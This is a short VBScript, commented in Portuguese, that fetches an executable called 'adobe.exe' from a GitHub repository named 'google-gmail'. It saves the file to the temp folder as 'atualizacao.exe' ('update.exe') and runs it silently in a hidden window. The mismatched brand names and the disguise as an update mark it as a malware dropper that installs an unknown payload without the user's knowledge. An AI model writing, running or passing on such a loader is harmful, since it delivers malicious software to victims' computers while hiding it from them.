Option Explicit

Dim url, caminhoDestino, http, stream, fso

' URL do arquivo hospedado no GitHub (use o link RAW direto)
url = "https://raw.githubusercontent.com/corinthias2025/google-gmail/refs/heads/main/adobe.exe"

' Caminho para salvar o arquivo temporariamente
Set fso = CreateObject("Scripting.FileSystemObject")
caminhoDestino = fso.GetSpecialFolder(2) & "\atualizacao.exe"

' Fazer o download do arquivo
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' binário
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile caminhoDestino, 2
    stream.Close

    ' Executar o arquivo baixado
    CreateObject("WScript.Shell").Run Chr(34) & caminhoDestino & Chr(34), 0, False
Else
    MsgBox "Erro ao baixar o arquivo: " & http.Status
End If
